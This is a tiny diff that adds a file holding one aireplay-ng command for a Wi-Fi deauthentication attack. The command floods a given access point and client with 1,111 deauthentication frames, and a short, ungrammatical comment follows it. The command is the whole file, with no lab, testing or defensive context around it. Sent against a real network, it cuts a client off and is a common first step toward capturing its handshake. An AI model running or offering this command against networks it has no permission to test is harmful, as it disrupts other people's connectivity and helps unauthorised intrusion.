@@ -1,0 +1,4 @@
+
+aireplay-ng --deauth 1111 -a macadress-of-ap -c macadress-of-client mon0
+
+#Have be used for computers!
